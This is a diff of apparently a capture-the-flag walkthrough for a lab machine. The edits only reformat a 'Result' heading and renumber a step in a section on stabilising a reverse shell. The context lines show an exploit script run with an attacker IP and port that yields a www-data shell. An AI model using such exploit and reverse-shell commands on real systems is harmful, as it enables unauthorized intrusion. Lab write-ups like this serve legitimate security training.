@@ -1425,7 +1425,8 @@ To achieve a "Gold Standard" interactive shell, follow these steps:
 
 In your current terminal, press **Ctrl+Z**. This suspends the reverse shell and returns you to your Kali prompt.
 
-Result:
+**Result:**
+
 ```shell
 www-data@variatype:~/portal.variatype.htb/public/files$ ^Z
 zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
@@ -1452,7 +1453,7 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 <br>
 </div>
 
-#### Step 2: Reset Remote Environment
+#### Step 3: Reset Remote Environment
 
 Once the shell is back, type `reset` and hit enter. If it asks for a terminal type, type `xterm-256color`.
 <div align="center">
